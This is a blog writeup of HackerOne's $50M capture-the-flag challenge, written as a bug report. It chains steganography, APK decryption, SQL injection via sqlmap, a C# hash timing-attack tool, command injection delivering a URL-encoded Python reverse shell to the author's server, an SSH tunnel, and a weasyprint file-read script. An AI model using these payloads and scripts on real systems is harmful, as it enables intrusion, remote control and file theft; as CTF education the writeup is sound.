---
layout: post
title:  "Yet another $50M CTF writeup!"
date:   2019-03-28 17:16:35 -0400
categories: hackerone ctf
---

This is my writeup for the $50M CTF by [HackerOne](https://www.hackerone.com). This was my first proper CTF and I don't have much experience in the bug bounty world either so everything was new from the beginning to the end, including the report-writing part. What I went for in this report was more of a "bug report to a program" style and not "blog for an audience" style. Everything was not as straightforward as the report suggests, I'll add some notes to give more context here and there. In hindsight my report was probably way too "straightforward" and lacks a lot of details about how I actually worked to come to all those conclusions. I'll be better next time!

Note: Anywhere you see `W.X.Y.Z` it's my VPS IP.

So without furder ado...

# Several vulnerabilities lead to Remote Code Execution and Arbitraty File Read on multiple servers

## Summary

- Tweeted image contained URL [https://bit.do/h1therm](https://bit.do/h1therm) to download an APK
- APK API (35.243.186.41) is vulnerable to SQL Injection on `username` parameter and leaked location of server 104.196.12.98 through the `devices` table
- Login form on 104.196.12.98 is vulnerable to timing attack on `hash` parameter
- `/update` page on 104.196.12.98 is vulnerable to Server Side Request Forgery on `update_host` parameter
- Local invoice system vulnerable to Local File Inclusion on page `/invoices/new/pdfize` using weasyprint's attachment feature, which allows reading flag `c8889970d9fb722066f31e804e351993` in `main.py`

## Steps To Reproduce

For details on how an attacker can access the invoice system see the detailed description. These steps assume you have access to the system from your internal network

1. Visit the following URL: [http://172.28.0.3/invoices/pdfize?d=%7B%22companyName%22%3A%22%22%2C%22email%22%3A%22%22%2C%22invoiceNumber%22%3A%22%22%2C%22date%22%3A%22%22%2C%22items%22%3A%5B%5B%221%22%2C%22%22%2C%22%22%2C%2210%22%5D%5D%2C%22styles%22%3A%7B%22body%22%3A%7B%22%3C/style%20%22%3A%22%22%2C%22%3E%3Clink%20rel%3Dattachment%20href%3D%5C%22file%3A//main.py%5C%22%20/%3E%22%3A%22%22%7D%7D%7D](http://172.28.0.3/invoices/pdfize?d=%7B%22companyName%22%3A%22%22%2C%22email%22%3A%22%22%2C%22invoiceNumber%22%3A%22%22%2C%22date%22%3A%22%22%2C%22items%22%3A%5B%5B%221%22%2C%22%22%2C%22%22%2C%2210%22%5D%5D%2C%22styles%22%3A%7B%22body%22%3A%7B%22%3C/style%20%22%3A%22%22%2C%22%3E%3Clink%20rel%3Dattachment%20href%3D%5C%22file%3A//main.py%5C%22%20/%3E%22%3A%22%22%7D%7D%7D) and download the PDF
2. Extract the attachment using a PDF reader or the `pdfdetach` command-line tool
3. Read the `c8889970d9fb722066f31e804e351993` flag

## Detailed description

### The tweet

The image tweeted [here](https://pbs.twimg.com/media/D0XoThpW0AE2r8S.png:large) contained a link to download an APK hidden with steganography. I used a tool named [`zsteg`](https://github.com/zed-0xff/zsteg) to extract the information from the image and obtain the URL [https://bit.do/h1therm](https://bit.do/h1therm).

```bash
curl -s https://pbs.twimg.com/media/D0XoThpW0AE2r8S.png:large -o tweet.png
zsteg --bits 1 --channel rgb --lsb --order yx tweet.png
```

> BLOG NOTES!  
> Unlike other brilliant people who got information from the binary patterns in the background of the image, I threw steg tools at the image until it worked. ¯\\\_(ツ)_/¯  
> The command I used is actually `zteg -a tweet.png` but there is a lot of garbage output so I refined it for the report to make sure it only outputs the relevant line.

### The APK

I extracted the source code of the APK using a tool named [`jadx`](https://github.com/skylot/jadx) (`jadx h1thermostat.apk -d h1thermostat-apk`) then I created a Java app based on that source code to be able to encrypt and decrypt requests and responses sent to the API at 35.243.186.41, which is the Android application's backend.

The program is the following:

```java
import java.security.Key;
import java.security.SecureRandom;
import java.security.spec.AlgorithmParameterSpec;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import org.json.JSONObject;
import org.json.JSONException;

class RequestBuilder {
    public static void main(String[] args) throws Exception {
        switch (args[0]) {
        case "build":
            JSONObject obj = new JSONObject();
            obj.put("username", args[1]);
            obj.put("password", args[2]);
            obj.put("cmd", args[3]);
            if (args.length == 6) {
                obj.put(args[4], args[5]);
            }
            System.out.print(buildPayload(obj));
            break;

        case "parse":
            System.out.print(parseNetworkResponse(args[1]));
            break;

        default:
            break;
        }
    }

    private static String buildPayload(JSONObject paramJSONObject) throws Exception {
        Key key = new SecretKeySpec(
                new byte[] { 56, 79, 46, 106, 26, 5, -27, 34, 59, -128, -23, 96, -96, -90, 80, 116 }, "AES");
        byte[] arrayOfByte = new byte[16];
        new SecureRandom().nextBytes(arrayOfByte);
        IvParameterSpec localIvParameterSpec = new IvParameterSpec(arrayOfByte);
        Cipher localCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        localCipher.init(1, key, localIvParameterSpec);
        byte[] cipherBytes = localCipher.doFinal(paramJSONObject.toString().getBytes());
        byte[] localObject = new byte[cipherBytes.length + 16];
        System.arraycopy(arrayOfByte, 0, localObject, 0, 16);
        System.arraycopy(cipherBytes, 0, localObject, 16, cipherBytes.length);
        Base64.Encoder encoder = Base64.getEncoder();
        return encoder.encodeToString((byte[]) localObject);
    }

    private static String parseNetworkResponse(String data) throws Exception {
        Base64.Decoder decoder = Base64.getDecoder();
        byte[] localObject1 = decoder.decode(data);
        Object localObject2 = new byte[16];
        System.arraycopy(localObject1, 0, localObject2, 0, 16);
        byte[] paramNetworkResponse = new byte[localObject1.length - 16];
        System.arraycopy(localObject1, 16, paramNetworkResponse, 0, localObject1.length - 16);
        Key key = new SecretKeySpec(
                new byte[] { 56, 79, 46, 106, 26, 5, -27, 34, 59, -128, -23, 96, -96, -90, 80, 116 }, "AES");
        AlgorithmParameterSpec algo = new IvParameterSpec((byte[]) localObject2);
        Cipher localCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        localCipher.init(2, key, algo);
        return new String(localCipher.doFinal(paramNetworkResponse));
    }
}
```

Once compiled, I used the following bash script to play with the API a bit and discover that it seemed vulnerable to SQL injection.

```bash
payload=`java -cp org.json.jar:. RequestBuilder build $1 $2 $3 $4 $5` # Parameters are username, password, cmd, commandName (optional), commandArgument (optional)
response=`curl -s -X POST -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" --data-urlencode "d=$payload" http://35.243.186.41/`
java -cp org.json.jar:. RequestBuilder parse "$response"
```

After manual testing and then some poking with [`sqlmap`](http://sqlmap.org/) I discovered that the backend was running on a database named `flitebackend` and that the credentials to log in the Android app were admin/password. Also in this database is the `devices` table which was obtained with the following `sqlmap` command.

```bash
sqlmap -u http://35.243.186.41/ --dbms=mysql --data "d=tamper" --tamper ~/full/path/to/tamper.py --batch --technique T --level=5 --risk=3 --dump -D flitebackend -T devices -C ip -p d
```

with `tamper.py` being the following python script

```python
#!/usr/bin/env python
import subprocess
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOWEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    result = subprocess.check_output(["sh", "/full/path/to/tamper.sh", payload])
    return result
```

which in turn called this bash script

```bash
cd ~/full/path/top/javaapp
java -cp org.json.jar:. RequestBuilder build "$1" "123" "getTemp" 2>NUL
exit 0
```

It could have been done directly in python however I'm more familiar with bash. The result of this was that I could obtain the entire `devices` table. Most of the IPs were dead or internal and unreachable to me, however 104.196.12.98 was alive and accessible.

> BLOG NOTES!  
> I hesitated before resorting to `sqlmap`. You know, the dreaded *skid* tag is looming everytime you use that. Since the ending date of the CTF was unknown, I decided to swallow my pride and go with the quick solution. Some good came out of this though and there is a new feature in `sqlmap` now! See this [feature request](https://github.com/sqlmapproject/sqlmap/issues/3505) I opened after completing this step. Props to the `sqlmap` maintainer who implement this super quickly.

### H1Thermostat (Flitebackend) login

The login page on 104.196.12.98 hashes the credentials then sends them to the server in a POST request in the `hash` parameter. I noticed that if I sent invalid input (a shorter string for example) the response was immediate, while an invalid user/pass but with a real hash took 500 ms quite reliably. This suggested that the hash was validated byte by byte and a timing attack was possible. After some trial and error it appeared that the timing was `500 * i` where `i` is the 1-based position of the byte. I wrote the following C# application and was able to recover a valid hash: `f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8`

```csharp
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Threading.Tasks;

namespace HashTimingAttack
{
    class Program
    {
        const string Url = "http://104.196.12.98/";
        const string HashParamName = "hash";
        const int HashBytes = 32;
        private static readonly string[] PossibleValues = Enumerable.Range(0, 256).Select(x => ((byte)x).ToString("x").PadLeft(2, '0')).ToArray();

        static void Main(string[] args)
        {
            Random rnd = new Random();
            string hash = string.Empty;
            using (var httpClient = new HttpClient())
                for (int i = 0; i < HashBytes; i++)
                {
                    var desiredTime = (i + 2) * 500;
                    var @break = false;
                    foreach (var x in PossibleValues.OrderBy(x => rnd.Next()))
                    {
                        var attempt = (hash + x).PadRight(HashBytes * 2, '0');
                        var content = new FormUrlEncodedContent(new[] { KeyValuePair.Create(HashParamName, attempt) });
                        var success = false;
                        while (!success)
                        {
                            try
                            {
                                var milliseconds = GetTiming(httpClient, content);
                                Console.WriteLine($"[*] {milliseconds} ms for {attempt}.");

                                if (milliseconds > desiredTime && milliseconds < (desiredTime + 99))
                                {
                                    Console.WriteLine($"[+] Found {x}, verifying!");
                                    milliseconds = GetTiming(httpClient, content);
                                    if (milliseconds > desiredTime && milliseconds < (desiredTime + 99))
                                    {
                                        Console.WriteLine($"[+] {x} has been double checked and is correct!");
                                        hash += x;
                                        @break = true;
                                    }
                                    else
                                        Console.WriteLine("[-] False positive! keep going.");

                                }
                                else if (milliseconds < (desiredTime - 500))
                                {
                                    Console.Error.WriteLine("Picked a wrong branch!");
                                    Environment.Exit(1);
                                }

                                success = true;
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine($"[-] Request failed. Retrying. {ex}");
                            }
                        }

                        if (@break) break;
                    }
                }
        }

        private static long GetTiming(HttpClient httpClient, FormUrlEncodedContent content)
        {
            var sw = Stopwatch.StartNew();
            httpClient.PostAsync(Url, content).Wait();
            sw.Stop();
            return sw.ElapsedMilliseconds;
        }
    }
}
```

> BLOG NOTES!  
> I had this great conversation with @thepsi on the [Hacker101](https://www.hacker101.com/) [discord server](https://www.hacker101.com/discord). It went something like
>
> > **Me:** It fails faster when I send it garbage. I can't believe that hash is validated byte by byte... who would do that!?  
> > **Thepsi:** That's what I thought for a day, and now I have solved it.
>
> Soooooo I build a tool for the timing attack. :) I'll take this moment to shoutout Thepsi who helped me a lot by being my [rubber duck](https://en.wikipedia.org/wiki/Rubber_duck_debugging) and listening to be rambling.
>
> Why C# out of no where? It's my what I've been using professionally for many years and what I'm fastest/best at.

### H1Thermostat (Flitebackend) admin page

The backend has 4 pages: `/main`, `/control`, `/diagnostics` and `/update`. After some fuzzing I discovered the `port` and `update_host` parameters on the `update` page. Anything else than an integer crashed the `port` parameter, however the `update_host` is sent straight to the command line with no validation. This can be verified with [http://104.196.12.98/update?update_host=;%20whoami%20\|\|](http://104.196.12.98/update?update_host=;%20whoami%20\|\|) which reveals we are running commands as `root`.

I setup a netcat listener on my VPS (`nc -lvp 82`) and connected to it using [http://104.196.12.98/update?update_host=%3E/dev/null;%20python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%22W.X.Y.Z%22%2C82))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3B%20os.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call([%22%2Fbin%2Fbash%22%2C%22-i%22])%3B%27%20%26%3E1%20;%20echo](http://104.196.12.98/update?update_host=%3E/dev/null;%20python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%22W.X.Y.Z%22%2C82))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3B%20os.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call([%22%2Fbin%2Fbash%22%2C%22-i%22])%3B%27%20%26%3E1%20;%20echo)

With that I could install [`nmap`](https://nmap.org/) using `apt`, then I checked the local network mask (using `ip a`, it's 172.28.0.2/16) and scanned the network (`nmap -sP 172.28.0.2/16`) to see if there were other machines I could reach.

This allowed me to discover an invoicing system on 172.28.0.3. I setup a tunnel to my VPS (`ssh h1@W.X.Y.Z -R 0.0.0.0:8001:172.28.0.3:80 -fN -o StrictHostKeyChecking=no -o PubkeyAuthentication=no`) to expose the server externally.

P.S.: While exploring the machine, I saw with `ps aux` that there were other attackers connected, I'm afraid this vulnerability has already been exploited!

> BLOG NOTES!  
> Finding the `update_host` parameter was quite a challenge. [@daeken](https://twitter.com/daeken) (The author of this CTF, thank you for the fun times!) tweeted a single underscore and I knew that such a cryptic tweet had to be a clue. I had been trying to fit in `_` in all my attacks up to now but it's on this step that it was useful.
>
> The big URL contains an URL-encoded python command to connect to my listener. `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("W.X.Y.Z",82));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`
>
> As soon as we leave the web, I'm a complete newb. Scanning the network didn't even occur to me at first. I saw people on the next machine using `ps` and *then* I understood what I should have done. Setting up the port forwarding what quite a challenge as well! I had no idea what I was doing but I read a ton and learned so much. I had a lot of fun in this part.

### Reports and invoicing system

A combination of factors allows an attacker to read any file on the machine

- The invoice system's `/invoices/new` page, the `/invoices/preview` API and the `/invoices/pdfize` API do not require authentication
- The `style` property of the JSON object passed in the `d` parameter to `/invoices/pdfize` isn't property sanitized
  - More precisely, the CSS property names allow HTML characters like `<` and `>`
- Weasyprint (the library used here) allows including files into the PDF using `<link rel=attachment href="PATH" />` in the HTML source for the PDF
  - It's a [documented feature](https://weasyprint.readthedocs.io/en/stable/features.html?highlight=attachment#pdf)
  - The information about weasyprint was leaked using a `background-image` CSS property to load an attacker-controlled image
  - The vendor and version (weasyprint 44) were in the HTTP headers

With all of this, I could make the following bash script to download any file from the server

```bash
VPS_IP="W.X.Y.Z"
VPS_PORT="80"

FILEPATH="main.py" # Path of the file to download. Can be relative to where the app is running or absolute.

QUERY="{\"companyName\":\"\",\"email\":\"\",\"invoiceNumber\":\"\",\"date\":\"\",\"items\":[[\"1\",\"\",\"\",\"10\"]],\"styles\":{\"body\":{\"</style \":\"\",\"><link rel=attachment href=\\\"file://$FILEPATH\\\" />\":\"\"}}}"
ENCODED_QUERY=$(python -c "import urllib.parse, sys; print(urllib.parse.quote(sys.argv[1]))" "$QUERY") # python3

curl "http://$VPS_IP:$VPS_PORT/invoices/preview?d=$ENCODED_QUERY" -o ./50m-ctf/pdfize.pdf

pdfdetach -save 1 -o "./50m-ctf/$(basename $FILEPATH)" ./50m-ctf/pdfize.pdf
```

Reading the `main.py` allows an attacker to read the `c8889970d9fb722066f31e804e351993` flag.

> BLOG NOTES!  
> The bash script was overkill at this point, but it makes the whole thing so much cleaner.  
> For the HTML injection I used two CSS properties (the first one with an empty value) to evade filters and make a closing tag to get out of the CSS context and inject my HTML payload. The rendered HTML looked something like this:.
>
> ```html
> <style>
> /* some properties */
> body {
> </style :
> ><link rel=attachment href="file://main.py" />: }
> ```

## Impact

The 104.196.12.98 server is completely compromised and an attacker could, among other things, take the service down or modify the application to serve bad content to unsuspecting users.

The local machine serving the invoices system is vulnerable to arbitrary file read and nothing on that machine can be considered private anymore.

Evidence suggests that these vulnerabilities have already been exploited and the machines are already compromised.

## Conclusion (to the blog post, the report is over)

This was a crazy experience that completely captivated me for a few weeks. Thanks to Cody/daeken for putting this together, thanks to everyone I chatted with during the CTF on the Discord channel and congratulations to everyone who tried the CTF, you're all champs even if you didn't get to the end.

I have learned a lot about hacking during the CTF and a lot about writing after reading other people's writeups. I can't wait to test these new skills on another CTF!